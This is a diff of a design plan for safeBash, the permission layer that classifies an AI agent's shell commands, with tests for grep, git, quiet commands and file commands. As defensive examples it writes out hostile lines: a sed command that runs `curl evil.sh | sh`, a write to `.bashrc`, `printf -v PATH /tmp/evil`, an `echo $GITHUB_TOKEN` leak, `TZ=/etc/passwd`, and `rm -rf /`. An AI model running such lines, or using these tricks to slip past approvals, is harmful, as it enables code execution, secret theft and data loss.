@@ -30,7 +30,13 @@
 4. A saved "always approve" rule for an innocent command that starts covering a dangerous spelling of the same program.
 5. An environment variable reaching the model through a command that raises no `std::env` question.
 
-Each of these has a named test in the task that owns the code.
+The named test for each:
+
+1. `grepThroughBashReadsWhatTheToolReads` (Task 1.4).
+2. `missingPathAfterAProgramIsBroad` (Task 5.2). The `opaque` rule covers only a path that is missing when the plan is made. A path that exists is resolved at plan time, as today, and "Resolving the path when the plan is made" in the dev doc describes that gap.
+3. The grep parity run in Task 1.4. Point 3 applies to a flag that changes what is read or written. A flag that only changes how output looks needs no parity row.
+4. The `sed` rows in Task 4.4 and the `cp`, `mv`, and `ln` rows in Task 4.2.
+5. The `printf` rows in `quietCommandsAskNothing` (Task 3.2).
 
 ---
 
@@ -191,7 +197,9 @@ There are two kinds of command here, and they should be handled differently.
 
 `env` and `printenv` are not on the list. They print the environment, which is what `std::env` guards.
 
-`which` and `whereis` are in `NO_EXEC_PROGRAMS` today so that the model cannot look up the `agency` binary. The new rule keeps that: a lookup of the name `agency` has no rule.
+`which` and `whereis` are in `NO_EXEC_PROGRAMS` today so that the model cannot look up the `agency` binary. Both stay in that list. The new rule accepts a `which` whose names do not end in `agency`, and any other `which` falls through to the list, as today.
+
+`printf` is the one command here that needs care. `printf -v PATH /tmp/evil` sets the shell variable `PATH`, so the next command in the line would run a program from `/tmp/evil` under an approval for the real one. The rule for `printf` is that its first word is literal and does not start with `-`, and every other word is literal or `$?`.
 
 **Wrappers.** `timeout 60 pnpm test` has no rule today because `timeout` runs another program. The rule I propose reads through it: `timeout` followed by one number asks whatever the inner command asks. So the line asks `std::exec { pnpm, test }`. Any flag on `timeout` has no rule. `time` cannot be done here, because the parser rejects it as a reserved word. `npx` stays as it is, for the reason in the dev doc.
 
@@ -210,10 +218,12 @@ The `std::exec` payload has no field for the environment. So a saved rule for `p
 A small set of names only changes how output looks. I would allow those, with a literal value, and keep refusing every other name:
 
 ```
-TERM  NO_COLOR  FORCE_COLOR  CLICOLOR  CLICOLOR_FORCE  COLUMNS  LINES  LC_ALL  LANG  TZ  CI
+TERM  NO_COLOR  FORCE_COLOR  CLICOLOR  CLICOLOR_FORCE  COLUMNS  LINES  LC_ALL  LANG  TZ
 ```
 
-> **Decision 3.** Is that list right? `NODE_ENV` is the common name I left out. It changes which config a program loads, so `NODE_ENV=production pnpm migrate` under a saved rule for `pnpm migrate` would be a surprise. I recommend leaving it out.
+The value must be made of letters, digits, and `. _ - :` only. A value with a `/` has no rule, because the C library reads `TZ=/some/path` and a locale name with a slash as a file to open.
+
+> **Decision 3.** Is that list right? Two common names are left out. `NODE_ENV` changes which config a program loads, so `NODE_ENV=production pnpm migrate` under a saved rule for `pnpm migrate` would be a surprise. `CI` changes what programs do, not how output looks: `pnpm install` uses the frozen lockfile under it, and test runners change mode. I recommend leaving both out.
 
 **`/dev/null`: yes, all of it is a no-op.** Output to `/dev/null` already asks nothing. Two spellings are still missing:
 
@@ -302,8 +312,8 @@ Agreed. Each command should raise the most specific effect that exists:
 | `touch a` | `std::exec { touch, a }` | `std::write { dir, filename, content: "", mode: "append" }` |
 | `cmd \| tee out.log` | `std::bash` | `std::write` for `out.log`, like `>` |
 | `sed -n 10,20p f` | `std::exec { sed, -n }` | `std::read` for `f` |
-| `stat f`, `file f` | `std::exec` | `std::ls` for the folder, like `ls -l f` |
-| `md5sum f`, `shasum f` | `std::exec` | `std::read` for `f` |
+| `stat f` | `std::exec` | `std::ls` for the folder, like `ls -l f` |
+| `md5sum f`, `shasum f`, `file f` | `std::exec` | `std::read` for `f` |
 
 Two of these fix a real over-approval today. "Always approve" for `cp package.json /tmp/x` saves the pair `cp` and `package.json`. "Always approve" for `mkdir -p x` saves `mkdir` and `-p`, which covers a `mkdir -p` anywhere on the machine.
 
@@ -334,7 +344,7 @@ Agreed. `for` loops, `$(...)`, heredocs, brace groups, and pipes into `awk` or `
 git status && echo $GITHUB_TOKEN
 ```
 
-The model then reads the token, and no `std::env` question was asked. This is already noted as unanswered in the gh work. It is not made worse by this plan: Decision 2 keeps a line with a variable off the new quiet effect. The fix would be for a variable word in an `echo` or `printf` to ask `std::env` for that name.
+The model then reads the token, and no `std::env` question was asked. This is already noted as unanswered in the gh work. It is not made worse by this plan: Decision 2 keeps a line with a variable off the new quiet effect, and `printf` takes only literal words and `$?`, so it is not a second spelling of the same leak. The fix would be for a variable word in an `echo` or `printf` to ask `std::env` for that name.
 
 > **Decision 6, made 2026-11-20.** Filed separately as ADI-356. This plan does not fix it.
 
@@ -344,11 +354,11 @@ Point 3 of the group table is eight lines of git reads with no rule. The git rul
 
 | Command | Asks | Why the payload is true |
 |---|---|---|
-| `git rev-parse HEAD`, `--short`, `--abbrev-ref`, `--verify`, one ref | `std::git::log { ref }` | It prints the hash or name of a commit that `git log <ref>` prints. |
+| `git rev-parse <ref>`, alone or with `--short`, `--abbrev-ref`, or `--verify` | `std::git::log { ref }` | It prints the hash or name of a commit that `git log <ref>` prints. |
 | `git rev-parse --show-toplevel`, `--git-dir`, `--is-inside-work-tree` | `std::git::status` | It prints where the repository is. |
 | `git merge-base A B` | `std::git::log` for `A` and for `B` | It prints one commit from the history of both. |
 | `git ls-files [path]` | `std::ls { dir, recursive: true }` | It lists names under the folder. `ls -R` lists more. |
-| `git grep <pattern> [-- paths]` | `std::grep` per path | It searches tracked files under the folder, which is fewer than the tool searches. |
+| `git grep <pattern> [-- paths]` | `std::grep` per path | It searches tracked files under the folder. safeBash writes exclude pathspecs for the six skipped names, so it reads no file the tool skips. |
 | `git grep <pattern> <ref> [-- paths]` | `std::git::show { ref }` | It reads file contents from that commit, as `git show ref:path` does. |
 | `git worktree list` | `std::git::branchList` | It prints branches and where each is checked out. |
 | `git --no-pager <sub>` | what `<sub>` asks | safeBash already writes `-c core.pager=cat`. The flag is dropped. |
@@ -366,9 +376,10 @@ Order is by how many lines each PR helps, with PR 3 pulled early because the tar
 | PR | What | Depends on | Size |
 |---|---|---|---|
 | T | tarsec: accept `$?` | Decision: none | half a day, plus a publish |
+| 3a | The tarsec pin and the `$?` test (Task 3.1) | PR T published | an hour |
 | 1 | grep through bash | Decision 1 | 2 to 4 days |
 | 2 | git reads | none | 1 to 2 days |
-| 3 | Quiet commands, wrappers, assignments, `/dev/null`, `$?` | PR T published, Decisions 2 and 3 | 2 days |
+| 3 | Quiet commands, wrappers, assignments, `/dev/null` | Decisions 2 and 3 | 2 days |
 | 4 | File commands raise file effects | none | 2 days |
 | 5 | Missing paths and files the line writes | none | 2 to 4 days |
 | 6 | Globs | follow-up, not built in this round | 2 to 3 days |
@@ -466,16 +477,22 @@ Each of the three only narrows what grep reads, so the payload stays true.
 ### Task 1.3: safeBash writes the grep command
 
 **Interfaces:**
-- Produces: `def grepCommand(split: SplitArgs, pattern: Word, paths: Word[], excludes: string[], redirects: Redirect[]): SimpleCommand`. It writes `grep`, then every flag from `split` (built from the checked data, as `flagWords` does for git), then one `--exclude-dir=<name>` per entry in `excludes`, then the pattern word, then the path words.
-- Produces: `_skipDirNames(): string[]` in `lib/stdlib/grepDialect.ts`, returning `SKIP_DIRS`. The existing `_skippedDirsNote` reads the same constant.
+- Produces: `def grepCommand(split: SplitArgs, pattern: Word, paths: Word[], excludes: string[], redirects: Redirect[]): SimpleCommand`. It writes these, in order:
+  1. `grep`.
+  2. Every flag from `split` except `-e`, built from the checked data, as `flagWords` does for git.
+  3. For each entry in `excludes`, `--exclude-dir=<name>` and `--exclude=<name>`. The grep tool's walk skips any entry with one of the six names, a file as well as a folder (`lib/stdlib/shell.ts:501`). In a git worktree `.git` is a file, and `--exclude-dir` alone would let real grep read it.
+  4. `-e`, then the pattern word. The pattern is always written this way, whether the model gave it with `-e` or as a word, so it is written once and a pattern that starts with `-` is never read as a flag.
+  5. `--`, then the path words. With `-r` and no path, it writes `.`. GNU grep searches the working folder in that case, and BSD grep reads stdin, and the payload names the working folder.
+- Produces: `_skipDirNames(): string[]` in `lib/stdlib/shell.ts`, beside `SKIP_DIRS`, which it returns as a list.
+- A test that fails if the names `grepCommand` writes differ from `SKIP_DIRS`. That equality is the safety argument for this PR.
 - Changes: `GrepRead`'s `search` arm holds `calls: GrepCall[]`, one per path. `grepSearchEffects` returns a `SimpleRule`, so `simpleCommandRule` gets a `"grep"` branch beside `"git"` and `"gh"`.
-- `optionsFirst` on `GREP_FLAGS` becomes false. safeBash now writes the flags first, so a flag after the path is safe.
+- A flag after the first positional is accepted only for a grep that safeBash rewrites, which is the `search` form. A grep that reads a pipe runs as the model wrote it, so `pnpm test | grep FAIL -v` keeps today's refusal: some greps read that `-v` as a file name. `readGrep` splits with `optionsFirst: false` and then, when the answer is `stdin`, refuses if any flag came after a positional. `SplitArgs` needs one new field for that, `lateFlag: boolean`.
 
 Rules, each with its reason in a comment:
 
 1. A file path: one `std::grep` with `file` set. No excludes are written for it.
 2. A folder path with `-r`: one `std::grep` with that `dir`. The excludes are written.
-3. A folder path whose own last segment is in the skip list: no rule. With `--exclude-dir=dist`, `grep -r x dist` searches nothing.
+3. A folder path whose own last segment is in the skip list: no rule. With `--exclude-dir=dist`, `grep -r x dist` searches nothing. The check looks at the path as written and at its real path, so `grep -rn x .` run inside a folder called `build` has no rule either.
 4. A folder path without `-r`: no rule, as today.
 5. Several paths: one `std::grep` each.
 6. The pattern must be one literal word. It goes in the payload as written.
@@ -500,8 +517,9 @@ Rules, each with its reason in a comment:
 
 ### Task 1.4: parity on a real tree (Review Focus 1 and 3)
 
-- [ ] Add to `tests/agency/stdlib/grep-fixtures/` a nested tree, made by the test in a temp folder, not committed: `.git/config`, `node_modules/p/i.js`, `src/a.ts`, `src/dist/b.js`, `src/sub/build/c.js`, each holding the word `needle`. Add `outside/s.txt` with `needle`, and a symlink `src/link.txt` to it, and a folder symlink `src/linkdir` to `outside`. Delete the folder with `safeDeleteDirectoryWithin` in a `finally`.
-- [ ] Test node `grepThroughBashReadsWhatTheToolReads`: run `grep -rn needle . | sort` through `safeBash` under a handler that approves `std::grep`. The output must be exactly `./src/a.ts:1:needle`.
+- [ ] Add to `tests/agency/stdlib/grep-fixtures/` a nested tree, made by the test in a temp folder, not committed: `.git/config`, `node_modules/p/i.js`, `src/a.ts`, `src/dist/b.js`, `src/sub/build/c.js`, each holding the word `needle`. Also a file named `src/build` and a file named `src/sub/.git`, each holding `needle`. All of this goes in a folder `tree/`. Beside it, not inside it, make `outside/s.txt` with `needle`. Add a symlink `tree/src/link.txt` to that file, and a folder symlink `tree/src/linkdir` to `outside`. Delete everything with `safeDeleteDirectoryWithin` in a `finally`.
+- [ ] Test node `grepThroughBashReadsWhatTheToolReads`: with `tree` as the working folder, run `grep -rn needle . | sort` through `safeBash` under a handler that approves `std::grep`. The output must be exactly `./src/a.ts:1:needle`.
+- [ ] Parity rows for rule 3 and for the no-path form: `grep -rn needle | sort` prints the same line, and `grep -rn needle src/dist | sort` is broad.
 - [ ] The same node runs the grep tool on the same folder with `respectGitignore: false` and compares the file names.
 
 This test runs on macOS locally and on GNU grep in CI. A difference between them is a finding, not a flake.
@@ -535,15 +553,17 @@ This test runs on macOS locally and on GNU grep in CI. A difference between them
 One row or one small function each, following Decision 7's table. All are reads, so none changes `gitStaysBroad`'s write rows.
 
 **Interfaces:**
-- `rev-parse`: a function `gitRevParseRule`, because what it asks depends on its flags. Flags `--short`, `--abbrev-ref`, `--verify` with exactly one ref ask `log { cwd, ref, path: "" }`. Flags `--show-toplevel`, `--git-dir`, `--is-inside-work-tree` with no ref ask `status { cwd }`. A mix of the two groups, or any other flag, has no rule.
+- `rev-parse`: a function `gitRevParseRule`, because what it asks depends on its flags. Exactly one ref, with no flag or with any of `--short`, `--abbrev-ref`, `--verify`, asks `log { cwd, ref, path: "" }`. Flags `--show-toplevel`, `--git-dir`, `--is-inside-work-tree` with no ref ask `status { cwd }`. A mix of the two groups, or any other flag, has no rule.
 - `merge-base`: a `GIT_VERBS` row with no flags and exactly two refs. `gitPayloads` returns two `log` effects.
-- `ls-files`: a row with flags `--others`, `--modified`, `--deleted`, `--cached`, and at most one path that names a folder. It asks `std::ls { dir, recursive: true, maxResults: 0 }`. `--exclude-standard` is allowed only with `--others`.
+- `ls-files`: a row with flags `--modified`, `--deleted`, `--cached`, `--others`, and `--exclude-standard`, and at most one path that names a folder. It asks `std::ls { dir, recursive: true, maxResults: 0 }`. `--others` and `--exclude-standard` are allowed only together. `--others` alone lists every ignored file, `node_modules` included, which is a very long listing and not what a model means. It prints names under skipped folders such as a tracked `dist`. That is within what a recursive `std::ls` through bash already covers: real `ls -R` prints those names too, and the dev doc's "What a recursive listing shows" records that decision.
 - `worktree`: a function that takes only the word `list` and the flag `--porcelain`. `worktree add` and `worktree remove` have no rule.
-- `grep`: a function `gitGrepRule`. Flags `-n -i -l -w -E -F -c`. With no ref, each path after `--` asks `std::grep` for that folder, or the working folder when there is none. With one ref before `--`, it asks `show { cwd, ref }`. `--no-index`, `-O`, and `--open-files-in-pager` are not on the list, because the first reads outside the repository and the other two run a program.
+- `grep`: a function `gitGrepRule`. Flags `-n -i -l -w -E -F -c`. With no ref, each path after `--` asks `std::grep` for that folder, or the working folder when there is none. With one ref before `--`, it asks `show { cwd, ref }`. In the form with no ref, a repository may track files under `dist` or `build`, which the grep tool never reads. So `gitCommand` writes two exclude pathspecs per skipped name after the model's paths: `':(exclude,glob)**/<name>/**'` for a folder and `':(exclude,glob)**/<name>'` for a file. With no path from the model it writes `.` first, because git needs one positive pathspec beside an exclude. `--no-index`, `-O`, and `--open-files-in-pager` are not on the list, because the first reads outside the repository and the other two run a program.
 
 - [ ] Test node `gitMappedReads` with one row per line of Decision 7's table, giving the effect names and the payload's `ref` or `dir`.
 - [ ] Add to `gitStaysBroad`: `git rev-parse --show-toplevel HEAD`, `git worktree add x`, `git grep --no-index x`, `git grep -O x`, `git ls-files --others`.
 - [ ] Extend `gitRunsWhatItAsked` with `git grep -n x main -- src`, which must run with the `--` in place.
+- [ ] In `gitMappedReads`, add the bare `git rev-parse HEAD`, and `git ls-files --others --exclude-standard`.
+- [ ] In `gitRunsSafely`, which makes its own repository: commit a file `dist/x.js` that holds the search word, and check that `git grep` of that word through `safeBash` does not print it. The same test checks that the exclude pathspec is valid on the git that macOS ships and on CI's.
 - [ ] Implement.
 
 ## PR 3: quiet commands, wrappers, assignments, `/dev/null`
@@ -551,14 +571,16 @@ One row or one small function each, following Decision 7's table. All are reads,
 **The hardest question:** Decision 2, what a line of only quiet commands asks.
 
 **Files:**
-- Modify: `package.json` and `../../pnpm-lock.yaml`: tarsec pin
-- Modify: `stdlib/safeBash.agency`: `verbEffects`, `execEffects`, `simpleCommandRule`, `redirectEffect`, `pipedProgram`, `bashPlan`
+- Modify: `stdlib/safeBash.agency`: `verbEffects`, `execEffects`, `simpleCommandRule`, `redirectEffect`, `pipedProgram`, `planLine`, `gitCommand`, `ghCommand`
+- Modify: `stdlib/effectSets.agency`: the `Shell` set, if Task 3.5 is built
 - Modify: `stdlib/safeBash/actions.agency`: the new effect
 - Modify: `stdlib/shell.agency`: the effect declaration
 - Modify: `lib/runtime/builtinPolicies.ts`: one rule
 - Test: `tests/agency/safeBash.agency`, `lib/runtime/builtinPolicies.test.ts`
 
-### Task 3.1: the tarsec pin and `$?`
+### Task 3.1: the tarsec pin and `$?` (its own small PR, 3a)
+
+This task is the only one that waits on the tarsec publish. It ships by itself, so the rest of PR 3 does not wait. Files: `package.json`, `../../pnpm-lock.yaml`, and the two test files.
 
 - [ ] Bump the pin to the published version.
 - [ ] Test node `exitStatusInEcho`: `pnpm test; echo "exit=$?"` is narrow with one `std::exec`. `cat $?` is broad. A lone `echo "exit=$?"` follows Task 3.5.
@@ -575,30 +597,33 @@ No classifier change is expected. If the first row fails, the cause is a rule th
 |---|---|---|
 | `pwd` | `-P -L` | none |
 | `true`, `false`, `:` | none | any |
-| `printf` | none | any, as `echo` takes |
+| `printf` | none | the first word is literal and does not start with `-`; every other word is literal or `$?` |
 | `basename`, `dirname` | none | literal |
 | `sleep` | none | one word of digits |
 | `date` | `-u` | at most one word that starts with `+` |
 | `uname` | `-a -s -r -m` | none |
 | `whoami`, `hostname` | none | none |
-| `which` | `-a` | literal names, none of them `agency` |
-| `type` | none | literal names, none of them `agency` |
-| `command` | `-v` only, and it is required | literal names, none of them `agency` |
+| `which` | `-a` | literal names, none with the last path segment `agency` |
+| `type` | none | the same |
+| `command` | `-v` only, and it is required | the same |
+
+The `printf` row reads the text of its first word, not its tag. The parser reads `"-v"` as a quoted word and not as a flag, and bash still takes it as the option once the quotes are gone. `refuseQuotedOption` already makes this check for grep.
 
 `pwd`, `true`, `false`, `:`, `printf`, `type`, and `command` are in `BUILTIN_VERBS`. The quiet step runs before `execEffects`, so the builtin refusal is never reached for a spelling the table accepts. A spelling it does not accept, such as `command ls` or `hostname newname`, falls through to today's refusal.
 
-`which` and `whereis` leave `NO_EXEC_PROGRAMS` only if every test that pins "no rule for `which`" is updated in the same commit. `whereis` stays.
+`which` and `whereis` stay in `NO_EXEC_PROGRAMS`. The quiet step runs first, so a `which` the table accepts never reaches the list, and `which agency; ls` and `which node_modules/.bin/agency` fall through to it and ask `std::bash` with no extra code.
 
-- [ ] Test node `quietCommandsAskNothing`: `pwd; ls src` is narrow with one `std::ls`. `which node && node --version` is narrow with one `std::exec`. `command -v gtimeout; ls` is narrow. `which agency`, `command ls`, `hostname x`, `date -s 1`, and `sleep $N` are broad.
+- [ ] Test node `quietCommandsAskNothing`: `pwd; ls src` is narrow with one `std::ls`. `which node && node --version` is narrow with one `std::exec`. `command -v gtimeout; ls` is narrow. `which agency`, `which node_modules/.bin/agency; ls`, `command ls`, `hostname x`, `date -s 1`, and `sleep $N` are broad. So are `printf -v PATH x; ls`, `printf "-v" PATH x; ls`, `printf $F x; ls`, and `printf "$GITHUB_TOKEN"; ls`. `printf 'a\n'; ls` and `printf "exit=$?\n"; ls` are narrow.
 - [ ] Implement.
 
 ### Task 3.3: `timeout`
 
 **Interfaces:**
-- Produces: `def unwrapTimeout(command: SimpleCommand): SimpleCommand | null`. It returns the inner command when the verb is `timeout`, the first argument is a word of digits with an optional `s`, `m`, or `h`, and at least one word follows. The inner command's verb is that next word.
-- `simpleCommandRule` calls it after its four checks. When it returns a command, the rule classifies that command and puts `timeout <duration>` back in front of the command it returns. When the inner rule returns anything other than a simple command, as a `git diff` does, the line has no rule.
+- Produces: `def unwrapTimeout(command: SimpleCommand): SimpleCommand | null`. It returns the inner command when the verb is `timeout` or `gtimeout`, which is the name coreutils gives it on macOS, the first argument is a word of digits with an optional `s`, `m`, or `h`, and at least one word follows. The inner command's verb is that next word.
+- `simpleCommandRule` calls it after its four checks. When it returns a command, the rule classifies that command and puts `timeout <duration>` back in front of the command it returns. The assignments go in front of `timeout`, never after it. They come from two places: the ones the model wrote before `timeout`, and the ones the inner rule added, such as the `GH_HOST=github.com` that `ghCommand` puts on a search. `timeout 5 GH_HOST=github.com gh …` would make `timeout` look for a program called `GH_HOST=github.com`. When the inner rule returns anything other than a simple command, as a `git diff` does, the line has no rule.
 
-- [ ] Test node `timeoutReadsThrough`: `timeout 60 pnpm test` asks `std::exec` with `command: "pnpm"`. `timeout 5 cat one.txt` asks `std::read`. `timeout -s KILL 5 pnpm test`, `timeout 5 timeout 5 ls`, and `timeout 5 git diff` are broad.
+- [ ] Test node `timeoutReadsThrough`: `timeout 60 pnpm test` asks `std::exec` with `command: "pnpm"`. `timeout 5 cat one.txt` asks `std::read`. `gtimeout 60 pnpm test` asks the same. `timeout -s KILL 5 pnpm test`, `timeout 5 timeout 5 ls`, and `timeout 5 git diff` are broad.
+- [ ] Test the text that runs for two rows: `TERM=dumb timeout 60 pnpm test` runs as written, and `timeout 5 gh search issues crash --repo o/r` runs as `GH_HOST=github.com timeout 5 gh search issues …`.
 - [ ] Unwrap in one place. The refuse wall reads the flat list from `flattenOne`, and the classifier reads the tree through `classifySimple`. Both must see the inner command, and a third reader added later must not be able to forget. So `flattenOne` returns the inner command for a `timeout`, and `classifySimple` unwraps before it calls `simpleCommandRule`. Neither `isRefused` nor any verb rule knows the word `timeout`. If this does not fit the two functions cleanly, stop and bring it back.
 - [ ] Add `timeout 5 rm -rf /`, `timeout 5 shred x`, and `timeout 5 git reset --hard` to the refusal tests. Each must be refused.
 - [ ] Build this task last in the PR.
@@ -607,18 +632,22 @@ No classifier change is expected. If the first row fails, the cause is a rule th
 ### Task 3.4: assignments and `/dev/null`
 
 **Interfaces:**
-- Produces: `static const QUIET_ASSIGNMENTS: string[]` with the eleven names from Decision 3. `simpleCommandRule` fails on an assignment only when its name is not in the list or its value is not literal.
+- Produces: `static const QUIET_ASSIGNMENTS: string[]` with the ten names from Decision 3. `simpleCommandRule` fails on an assignment when its name is not in the list, or when its value is not a literal made of letters, digits, and `. _ - :`.
+- `gitCommand` sets `assignments: []` and `ghCommand` sets its own list, so both drop what the model wrote. Each now puts the model's quiet assignments first and its own after them.
 - `redirectEffect` drops an input redirect whose literal target is `/dev/null`, and treats `&>` to `/dev/null` as it treats `>` to `/dev/null`. `pipedProgram` ignores the same input redirect.
 
-- [ ] Test node `quietAssignmentsAndNull`: `TERM=dumb pnpm test` asks one `std::exec`. `NO_COLOR=1 CI=1 pnpm test` asks one. `tv --help </dev/null` asks one. `pnpm test &>/dev/null` asks one. `PATH=/tmp pnpm test`, `TERM=$X pnpm test`, `NODE_OPTIONS=x pnpm test`, `pnpm test &>out.txt`, and `cat < /dev/null` are broad. The last is broad because `cat` with no path and no pipe reads a closed stdin, as today.
-- [ ] Test that the assignment survives the rebuild: `TERM=dumb git status` runs with `TERM=dumb` in front of the git command safeBash wrote.
+- [ ] Test node `quietAssignmentsAndNull`: `TERM=dumb pnpm test` asks one `std::exec`. `NO_COLOR=1 LC_ALL=C pnpm test` asks one. `tv --help </dev/null` asks one. `pnpm test &>/dev/null` asks one. `PATH=/tmp pnpm test`, `TERM=$X pnpm test`, `NODE_OPTIONS=x pnpm test`, `CI=1 pnpm test`, `TZ=/etc/passwd date`, `pnpm test &>out.txt`, and `cat < /dev/null` are broad. The last is broad because `cat` with no path and no pipe reads a closed stdin, as today.
+- [ ] Test that the assignment survives the rebuild: `TERM=dumb git status` runs with `TERM=dumb` in front of the git command safeBash wrote, and `NO_COLOR=1 gh search issues crash --repo o/r` runs with `NO_COLOR=1 GH_HOST=github.com` in front of the `gh` command.
 - [ ] Implement.
 
 ### Task 3.5: a line of only quiet commands (after Decision 2)
 
 **Interfaces (option A):**
 - `effect std::bash::readonly { command: string; cwd: string }` with `@always(command, cwd)`, declared in `stdlib/shell.agency` beside `std::bash`.
-- `bashPlan` today turns an empty effect list into `std::bash`. It now turns it into `std::bash::readonly` when every word in the line is literal, and into `std::bash` otherwise. `savedOutputLine` already computes this as `SavedOutputLine.literal`, using `isLiteralWord`. `planLine` passes that value to `bashPlan`. A `$?` word counts as literal for this check only, so the check needs its own small predicate beside `isLiteralWord`, not a change to it.
+- The change is in `planLine`, not in `bashPlan`. A line whose commands raise no effect never reaches `bashPlan`: `planLine` sees the empty list first and returns `broadPlan(source, verbs, { kind: "noEffects" })` (`stdlib/safeBash.agency:4162`). That branch now has two outcomes. When every word in the line is literal, it rebuilds the tree, as the narrow path below it does, and returns a plan with the one effect `std::bash::readonly` and a null `broadReason`. Otherwise it returns the broad plan, as today.
+- `savedOutputLine` already computes "every word is literal" as `SavedOutputLine.literal`, using `isLiteralWord`. A `$?` word counts as literal for this check only, so the check needs its own small predicate beside `isLiteralWord`, not a change to it.
+- Two lines that are not made of quiet commands also reach this branch today: a lone `cd x`, and `echo hi | grep h`. Both would ask the new question. That is correct for both, since neither reads a file nor changes one, but the question's wording must fit them. Use "Run this line, which reads and changes no file?".
+- `stdlib/effectSets.agency`: the `Shell` set gains `std::bash::readonly`. A person who runs with `--reject Shell` expects no shell to start, and this effect starts one.
 - `SafeBashEffects` gains the effect. `raiseOne` gains an arm with the message "Run these commands, which only print?".
 - `recommendedAutoApprovePolicy` gains `"std::bash::readonly": approve`.
 - `outcomeOf` reports such a plan as `narrow`.
@@ -626,7 +655,9 @@ No classifier change is expected. If the first row fails, the cause is a rule th
 A saved policy does not follow `recommended`. A person who already has `~/.agency-agent/policy.json` gets the new rule only when they run `/policy` and say yes. Until then a lone `pwd` asks them the new question. The PR description must say this.
 
 - [ ] Test node `quietLinesAskTheQuietQuestion`: `pwd`, `echo "---"`, `which node; date`, and `echo "exit=$?"` each ask `std::bash::readonly`. `echo $HOME` asks `std::bash`.
+- [ ] The same node: a lone `cd lib` and `echo hi | grep h` ask `std::bash::readonly`, and each runs the rebuilt text.
 - [ ] Test in `lib/runtime/builtinPolicies.test.ts` that `recommended` approves it and `minimal` does not.
+- [ ] Test that a run with `--reject Shell` under `recommended` rejects a lone `pwd`.
 - [ ] Implement.
 
 ## PR 4: file commands raise file effects
@@ -645,7 +676,8 @@ A saved policy does not follow `recommended`. A person who already has `~/.agenc
 - `static const MAKE_VERBS: Record<string, FlagSpec>`: `mkdir` takes `-p -v`, `touch` takes none. Both set `optionsFirst`.
 - `def makeEffects(verb, command, cwd, spec, redirects): Result<Effect[]>`, modeled on `removeEffects`. Each path is literal. `touch` resolves its path with `_resolveRedirectTarget`, the resolver `>` uses, and asks `std::write { dir, filename, content: "", mode: "append" }`.
 - `mkdir` needs the real path of a folder that may not exist yet. The `mkdir` tool gets it from `_realTarget`, which is `host.files.realPath` (`stdlib/fs.agency:132`). safeBash already wraps that call for `rm` as `_removeTargetIn(text, cwd, tildeMode)` in `lib/stdlib/safeBashRemove.ts`. Rename it `_realPathIn`, since it no longer serves only removal, and call it here. `mkdir` then asks `std::mkdir { dir }` with the path the tool itself would put in its payload. Do not add a second resolver.
-- First step of this task: a unit test that `_realPathIn` returns the expected path for `a/b/c` when `a` is missing, and when `a` is a symlink to a folder. If `realPath` cannot resolve a path with several missing steps, stop and bring that back before writing a new helper.
+- `realPath` handles a path with several missing steps. Its walker, `walkSpelling` in `lib/host/node/nodeFiles.ts`, resolves each step that exists, keeps every step after the first missing one as written, and fails on a dangling link. Pin that with a unit test for `a/b/c` when `a` is missing, and when `a` is a symlink to a folder.
+- `_removeTargetIn` passes the label `"rm"` to `resolveAgainstCwd` for its error text. `_realPathIn` takes the label as a parameter.
 
 - [ ] Test node `makeAsksLikeTheTools`: `mkdir -p a/b` asks one `std::mkdir` whose `dir` ends in `/a/b`. `mkdir a b` asks two. `touch x.txt` asks `std::write` with empty content and append mode. `mkdir -m 700 a`, `mkdir $X`, and `touch -t 0101 x` are broad.
 - [ ] Test under the `with-writes` policy for the fixture folder: `mkdir -p tmp/x` is approved, and `mkdir -p /usr/local/x` is not.
@@ -653,7 +685,9 @@ A saved policy does not follow `recommended`. A person who already has `~/.agenc
 
 ### Task 4.2: `cp` and `mv` (waits; only the first step below is built now)
 
-**Built now:** add `cp` and `mv` to `NO_EXEC_PROGRAMS`. Today "always approve" for `cp package.json /tmp/x` saves the pair `cp` and `package.json`, and the same answer for `mv -f a b` saves `mv` and `-f`, which covers every forced move on the machine. With both names in the list, a `cp` or `mv` line asks `std::bash`, which shows the whole line and saves only that exact line. Test rows: `cp a b` and `mv a b` are broad with the reason "no rule for `cp`".
+**Built now:** add `cp`, `mv`, and `ln` to `NO_EXEC_PROGRAMS`. `ln` is there for PR 5: a saved rule for `ln -sf` would let a line replace a file with a link to another one, under an approval that names neither (see Task 5.3). Test row: `ln -s a b` is broad.
+
+For `cp` and `mv`: Today "always approve" for `cp package.json /tmp/x` saves the pair `cp` and `package.json`, and the same answer for `mv -f a b` saves `mv` and `-f`, which covers every forced move on the machine. With both names in the list, a `cp` or `mv` line asks `std::bash`, which shows the whole line and saves only that exact line. Test rows: `cp a b` and `mv a b` are broad with the reason "no rule for `cp`".
 
 **Why the full rule waits.** It has six things to get right, and no logged session ran either command:
 
@@ -690,11 +724,17 @@ The design below is kept for the follow-up.
 
 **Interfaces:**
 - `sed` gets an arm that accepts exactly this shape: the flag `-n`, one literal script word that is digits, optionally a comma and digits, then `p`, and one path. It asks `std::read` for the path. Anything else falls through to `execEffects`, as today.
-- `md5sum`, `shasum`, `sha256sum`: rows in `READ_VERBS` with no flags and any number of paths.
-- `stat` and `file`: rows in `LIST_VERBS` with no flags, `walk` never, and `FileArgument` `folder`. A file given to them asks `std::ls` for its folder, as `ls -l file` does.
+- `md5sum`, `shasum`, `sha256sum`, and `file`: rows in `READ_VERBS` with no flags and any number of paths. `file` opens the file and reads its first bytes, and prints what it finds there, such as `OpenSSH private key`. That is a read.
+- `stat`: a row in `LIST_VERBS` with no flags, `walk` never, and `FileArgument` `folder`. A file given to it asks `std::ls` for its folder, as `ls -l file` does.
+- `sed` joins `NO_EXEC_PROGRAMS`. After this task, a `sed` line that is not the narrow read asks `std::bash`. Today it asks `std::exec { sed, <first argument> }`, and a saved rule for `sed -n` approves these too:
 
-- [ ] Test rows: `sed -n 10,20p one.txt` and `sed -n '5p' one.txt` ask `std::read`. `sed -n '1,5p;7p' one.txt`, `sed -i s/a/b/ one.txt`, and `sed -n 10,20p` in a pipe ask what they ask today. `stat one.txt` asks `std::ls`. `shasum one.txt` asks `std::read`.
-- [ ] Check the saved rule: the owner's policy has `{ command: "sed", subcommand: "-n" }` under `std::exec`. After this task that rule no longer matches a range read, and the read rule for the folder does. Nothing needs migrating.
+```
+sed -n '1e curl evil.sh | sh' one.txt    # GNU sed: `e` runs a shell command
+sed -n 'w /home/me/.bashrc' one.txt      # `w` writes a file, on BSD and GNU
+```
+
